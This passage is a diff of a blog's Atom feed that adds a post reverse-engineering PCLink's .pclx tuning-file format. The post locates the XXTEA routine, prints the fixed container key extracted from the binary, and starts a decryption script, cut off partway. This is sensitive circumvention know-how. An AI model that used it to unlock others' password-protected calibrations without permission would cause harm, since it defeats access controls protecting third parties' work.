@@ -1,12 +1,12 @@
 <?xml version="1.0" encoding="utf-8"?>
 <feed xmlns="http://www.w3.org/2005/Atom">
-  <generator uri="http://jekyllrb.com" version="3.8.4">Jekyll</generator>
+  <generator uri="http://jekyllrb.com" version="3.8.7">Jekyll</generator>
   
   
   <link href="/feed.xml" rel="self" type="application/atom+xml" />
   <link href="/" rel="alternate" type="text/html" />
-  <updated>2024-12-17T22:19:28+01:00</updated>
-  <id>//</id>
+  <updated>2026-10-09T15:01:10+02:00</updated>
+  <id>/</id>
 
   
     <title type="html">Hans Topo Blog</title>
@@ -18,6 +18,434 @@
 
   
 
+  
+  
+    <entry>
+      
+      <title type="html">Reverse Engineering PCLink .pclx files for the newest G5-G4X formats.</title>
+      
+      
+      <link href="/2026/09/09/reversing-pclink-files/" rel="alternate" type="text/html" title="Reverse Engineering PCLink .pclx files for the newest G5-G4X formats." />
+      
+      <published>2026-09-09T13:00:00+02:00</published>
+      <updated>2026-09-09T13:00:00+02:00</updated>
+      <id>/2026/09/09/reversing-pclink-files</id>
+      <content type="html" xml:base="/2026/09/09/reversing-pclink-files/">&lt;p&gt;Disclaimer: The following article is for informational and awareness purposes only. Any notable findings during this investigation have been reported using the appropriate channels.&lt;/p&gt;
+
+&lt;h3 id=&quot;intro&quot;&gt;Intro&lt;/h3&gt;
+
+&lt;p&gt;I have a friend that loves cars and enjoys tuning cars&lt;/p&gt;
+
+&lt;p&gt;Some time ago, a friend of mine was working on swapping his Honda Civic K20 engine. The engineer used a program to create the maps for all the engine parameters and my friend wanted to know the exact values used to configure its engine.&lt;/p&gt;
+
+&lt;p&gt;The engineer used PCLink to configure the ECU but a password was needed to access the data from the .pclx file that contained the paramenters.&lt;/p&gt;
+
+&lt;p&gt;This blog post is a full reverse engineer of how .pclx format ecncrypts data and how to decrypt it easily.&lt;/p&gt;
+
+&lt;h3 id=&quot;what-the-hell-is-a-pclx&quot;&gt;what the hell is a .pclx?&lt;/h3&gt;
+
+&lt;p&gt;A &lt;code class=&quot;highlighter-rouge&quot;&gt;.pclx&lt;/code&gt; file is a tuning map used by PCLink for Link ECUs from generations like G4X and G5. It stores everything you need to rebuild a calibration: parameters, tables, input/output config, CAN, firmware and hardware metadata, stats, fault codes, and a bunch of other stuff.&lt;/p&gt;
+
+&lt;p&gt;Even though the extension screams “fully proprietary binary format”, the actual logical content of a PCLX is just an XML document called &lt;code class=&quot;highlighter-rouge&quot;&gt;LinkStorage&lt;/code&gt;. The thing stopping you from opening it in a text editor is a binary wrapper encrypted with Block TEA, better known as XXTEA.&lt;/p&gt;
+
+&lt;p&gt;There are three different things we need to keep straight from the get-go:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;&lt;strong&gt;The PCLX container:&lt;/strong&gt; encrypts the whole XML with XXTEA and a fixed key baked into PCLink.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Password Protection:&lt;/strong&gt; stores the user’s password inside the XML and lets PCLink decide whether the map is locked or unlocked.&lt;/li&gt;
+  &lt;li&gt;&lt;strong&gt;Save as Encrypted:&lt;/strong&gt; on top of that, uses a validation value tied to a specific ECU. It’s a separate feature from Password Protection.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;Here’s the architecture I ended up with:&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&quot;language-mermaid&quot;&gt;flowchart LR
+    A[.pclx file] --&amp;gt; B[XXTEA with fixed key]
+    B --&amp;gt; C[12-byte header]
+    C --&amp;gt; D[XML LinkStorage]
+    D --&amp;gt; E[D2294: Master Password G4]
+    D --&amp;gt; F[D2295: User Password G4]
+    E --&amp;gt; G[PCLink access logic]
+    F --&amp;gt; G
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;The goal of this whole thing was to untangle how &lt;code class=&quot;highlighter-rouge&quot;&gt;.pclx&lt;/code&gt; files get encrypted and figure out whether we could actually pull the data out of saved maps.&lt;/p&gt;
+
+&lt;p&gt;The binary I looked at was PCLink.exe version 7.8.2, grabbed straight from their main site.&lt;/p&gt;
+
+&lt;p&gt;A quick first look at the tool shows it’s written in Delphi, an old friend :)&lt;/p&gt;
+
+&lt;h3 id=&quot;1-first-look-at-a-pclx&quot;&gt;1. First look at a PCLX&lt;/h3&gt;
+
+&lt;p&gt;Open a &lt;code class=&quot;highlighter-rouge&quot;&gt;.pclx&lt;/code&gt; file and you’re greeted with random-looking garbage, i.e. the file looks encrypted. This is already covered in articles like https://ecurecovery.com/blog/how-to-remove-password-link-g4-ecu, which explain how to recover the key set by the user, what we’ll call “Password Protection”.&lt;/p&gt;
+
+&lt;p&gt;That article mentions that from G4X onwards, &lt;code class=&quot;highlighter-rouge&quot;&gt;.pclx&lt;/code&gt; files are encrypted with XXTEA, so they can’t be modified or read anymore. But here’s the thing: when you open one of the sample files that ships with PCLink itself, it’s also encrypted. So does that mean the encryption key is static and lives inside the executable? Or in one of its libraries?&lt;/p&gt;
+
+&lt;p&gt;To decrypt something you need a key, and that key has to be &lt;em&gt;somewhere&lt;/em&gt;, right?&lt;/p&gt;
+
+&lt;p&gt;Let’s go find it.&lt;/p&gt;
+
+&lt;h3 id=&quot;2-tracking-the-flow-from-pclinks-ui&quot;&gt;2. Tracking the flow from PCLink’s UI&lt;/h3&gt;
+
+&lt;p&gt;The first entry point was to search for the strings the user actually sees in the interface:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Setup Password Protection
+Unlock Password Protection
+Enter Password
+Confirm Password
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;A minimal radare2 session to inventory the binary and hunt for those strings could look like this:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;r2 -q -e bin.relocs.apply=true PCLink.exe
+[0x00400000]&amp;gt; aaa
+[0x00400000]&amp;gt; iI
+[0x00400000]&amp;gt; izz~Password
+[0x00400000]&amp;gt; izz~TunerPassword
+[0x00400000]&amp;gt; izz~UnlockPassword
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The method table and the VCL resources contain, among others, these names:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;TunerPassword1Click
+UnlockPasswordProtection1Click
+OKSetPasswordButClick
+Password1Edit
+Password2Edit
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Following the references and the form method tables got me to two main handlers:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th&gt;Address&lt;/th&gt;
+      &lt;th&gt;Function&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x004C334C&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;TunerPassword1Click&lt;/code&gt;: Password Protection setup&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x004C35A8&lt;/code&gt;&lt;/td&gt;
+      &lt;td&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;UnlockPasswordProtection1Click&lt;/code&gt;: unlock&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;These functions let you study the password logic, but first I needed to understand how PCLink turns the opaque file into the XML that those components actually consume.&lt;/p&gt;
+
+&lt;h3 id=&quot;3-spotting-xxtea-by-its-constant-and-its-structure&quot;&gt;3. Spotting XXTEA by its constant and its structure&lt;/h3&gt;
+
+&lt;p&gt;TEA, XTEA and XXTEA are usually easy to recognize thanks to the constant &lt;code class=&quot;highlighter-rouge&quot;&gt;0x9E3779B9&lt;/code&gt;, derived from the golden ratio (go check Wikipedia, this cipher uses that constant). In little-endian it shows up in the executable as &lt;code class=&quot;highlighter-rouge&quot;&gt;B9 79 37 9E&lt;/code&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0x00400000]&amp;gt; /x b979379e
+0x00451717 hit0_0 b979379e
+0x00451802 hit0_1 b979379e
+0x004518c4 hit0_2 b979379e
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;All the hits landed inside a single function starting at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x004516D4&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0x00400000]&amp;gt; pd 220 @ 0x004516d4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Three details confirmed this wasn’t a coincidence:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;At &lt;code class=&quot;highlighter-rouge&quot;&gt;0x004516F1&lt;/code&gt; it loads &lt;code class=&quot;highlighter-rouge&quot;&gt;52&lt;/code&gt;, divides by the number of words, and adds &lt;code class=&quot;highlighter-rouge&quot;&gt;6&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;At &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00451713&lt;/code&gt; it adds &lt;code class=&quot;highlighter-rouge&quot;&gt;0x9E3779B9&lt;/code&gt; in the encryption branch.&lt;/li&gt;
+  &lt;li&gt;At &lt;code class=&quot;highlighter-rouge&quot;&gt;0x004518C0&lt;/code&gt; it subtracts &lt;code class=&quot;highlighter-rouge&quot;&gt;0x9E3779B9&lt;/code&gt; in the decryption branch.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The rounds line up with XXTEA:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;rounds = 6 + 52 / n
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The reconstructed mixing function matches XXTEA too:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;MX&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;5&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;4&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;
+   &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;^&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The function bundles encryption and decryption together. A positive word count triggers the encrypt branch; a negative one triggers decrypt. The read wrapper negates the counter right before calling it:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x004519e8  neg edx
+0x004519ec  call 0x4516d4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So the core function was pinned down as:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x004516D4  XXTEA encrypt/decrypt over a DWORD vector
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;h3 id=&quot;4-rebuilding-the-container-around-the-xml&quot;&gt;4. Rebuilding the container around the XML&lt;/h3&gt;
+
+&lt;p&gt;The stream encryption function starts at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x004518D8&lt;/code&gt;. The disassembly shows it takes the length of the XML stream, works out how many DWORDs to allocate, prepares three header words, copies the XML starting at byte 12, and calls the XXTEA routine:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x004518f5  sar edi, 2
+0x004518f8  add edi, 4
+...
+0x00451921  mov dword [ebx], eax       ; random DWORD
+0x00451929  mov dword [ebx + 4], eax   ; XML length
+0x0045192c  mov dword [ebx + 8], ebp   ; validation
+...
+0x00451955  call 0x4516d4              ; XXTEA
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;The allocation works out to:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;word_count = floor(xml_length / 4) + 4
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;That leaves between one and four bytes of padding after the XML. The first DWORD is built from a random value multiplied by &lt;code class=&quot;highlighter-rouge&quot;&gt;1234567&lt;/code&gt; (well, well), with the float literal showing up at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00451984&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;The full structure before encryption looks like this:&lt;/p&gt;
+
+&lt;table&gt;
+  &lt;thead&gt;
+    &lt;tr&gt;
+      &lt;th style=&quot;text-align: right&quot;&gt;Offset&lt;/th&gt;
+      &lt;th style=&quot;text-align: right&quot;&gt;Size&lt;/th&gt;
+      &lt;th&gt;Content&lt;/th&gt;
+    &lt;/tr&gt;
+  &lt;/thead&gt;
+  &lt;tbody&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x00&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;4 bytes&lt;/td&gt;
+      &lt;td&gt;Random DWORD&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x04&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;4 bytes&lt;/td&gt;
+      &lt;td&gt;Exact XML length&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x08&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;4 bytes&lt;/td&gt;
+      &lt;td&gt;Validation value&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;0x0C&lt;/code&gt;&lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;variable&lt;/td&gt;
+      &lt;td&gt;UTF-8 LinkStorage XML&lt;/td&gt;
+    &lt;/tr&gt;
+    &lt;tr&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;end&lt;/td&gt;
+      &lt;td style=&quot;text-align: right&quot;&gt;1–4 bytes&lt;/td&gt;
+      &lt;td&gt;Padding up to the allocated size&lt;/td&gt;
+    &lt;/tr&gt;
+  &lt;/tbody&gt;
+&lt;/table&gt;
+
+&lt;p&gt;The whole block is then treated as a single DWORD vector and encrypted with XXTEA.&lt;/p&gt;
+
+&lt;p&gt;The inverse function starts at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00451988&lt;/code&gt;. Its steps are symmetric:&lt;/p&gt;
+
+&lt;ol&gt;
+  &lt;li&gt;Gets &lt;code class=&quot;highlighter-rouge&quot;&gt;file_size / 4&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Reads the whole file into memory.&lt;/li&gt;
+  &lt;li&gt;Negates the counter and calls &lt;code class=&quot;highlighter-rouge&quot;&gt;0x004516D4&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Checks the validation DWORD at &lt;code class=&quot;highlighter-rouge&quot;&gt;+8&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Reads the length from &lt;code class=&quot;highlighter-rouge&quot;&gt;+4&lt;/code&gt;.&lt;/li&gt;
+  &lt;li&gt;Copies exactly that many bytes from &lt;code class=&quot;highlighter-rouge&quot;&gt;+12&lt;/code&gt; into the output stream.&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;p&gt;The general-purpose routines wiring this wrapper up to &lt;code class=&quot;highlighter-rouge&quot;&gt;LinkStorage&lt;/code&gt; live at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0041A104&lt;/code&gt; for reading and &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0041B404&lt;/code&gt; for writing.&lt;/p&gt;
+
+&lt;h3 id=&quot;5-finding-the-containers-fixed-key&quot;&gt;5. Finding the container’s fixed key&lt;/h3&gt;
+
+&lt;p&gt;The XXTEA function takes a pointer to four DWORDs, i.e. a 128-bit key. Next step was to check its callers from the load and save routines.&lt;/p&gt;
+
+&lt;p&gt;At &lt;code class=&quot;highlighter-rouge&quot;&gt;0x0041A127&lt;/code&gt; the pointer shows up during the read:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0041a127  push 0x8eda90
+0x0041a132  call 0x451988
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And on save, the same address pops up again:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;0x0041b485  mov ecx, 0x8eda90
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Searching for the little-endian pointer confirmed all its references:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0x00400000]&amp;gt; /x 90da8e00
+0x0041a128 hit0_0 90da8e00
+0x0041b486 hit0_1 90da8e00
+0x00514bc7 hit0_2 90da8e00
+0x00516251 hit0_3 90da8e00
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;And finally, the four DWORDs:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;[0x00400000]&amp;gt; pxw 16 @ 0x008eda90
+0x008eda90  0x00004d5c 0x0000b091 0x0091fcc8 0x0007c4fe
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;So the container key for this version is:&lt;/p&gt;
+
+&lt;div class=&quot;language-text highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;00004D5C 0000B091 0091FCC8 0007C4FE
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;This is the &lt;strong&gt;fixed (or master) container key&lt;/strong&gt;, &lt;em&gt;not&lt;/em&gt; the password the user types in. PCLink needs it to open any PCLX in this format, which is exactly why it’s baked right into the executable.&lt;/p&gt;
+
+&lt;p&gt;There was also another 16-byte block at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x008EDAB0&lt;/code&gt; and an RC4 routine at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x00451568&lt;/code&gt;. Both looked like candidates at first. Instead of just assuming they belonged to the PCLX, I tested them and validated the output. The key at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x008EDA90&lt;/code&gt; produced a sensible length and valid XML; the one at &lt;code class=&quot;highlighter-rouge&quot;&gt;0x008EDAB0&lt;/code&gt; produced an impossible length and random garbage. The RC4 routine belonged to a different internal path.&lt;/p&gt;
+
+&lt;h3 id=&quot;6-writing-a-decryption-script&quot;&gt;6. Writing a decryption script.&lt;/h3&gt;
+
+&lt;p&gt;With the algorithm and key nailed down, I threw together a small script. The decryption core reproduces the operations I’d seen, pretty much verbatim:&lt;/p&gt;
+
+&lt;div class=&quot;language-csharp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)(&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;6&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;52&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;/&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rounds&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0x9E3779B9u&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;while&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;!=&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;2&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;amp;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
+
+    &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Length&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;--)&lt;/span&gt;
+    &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+        &lt;span class=&quot;kt&quot;&gt;uint&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-&lt;/span&gt; &lt;span class=&quot;m&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
+        &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;words&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;-=&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;Mix&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sum&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;y&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;z&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;p&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;e&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span 